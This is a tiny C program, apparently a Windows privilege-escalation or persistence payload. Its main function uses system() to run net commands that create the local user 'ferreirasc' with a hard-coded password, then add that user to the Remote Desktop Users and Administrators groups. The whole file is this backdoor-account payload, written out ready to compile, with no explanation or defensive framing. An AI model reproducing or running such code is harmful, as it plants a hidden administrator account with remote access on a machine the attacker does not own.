#include <stdlib.h>
int main () {
   int i;
   i = system("net user ferreirasc BadPass1BadPass3 /add /y");
   i = system("net localgroup \"Remote Desktop Users\" ferreirasc /add");
   i=system("net localgroup administrators ferreirasc /add");
   return 0;
}
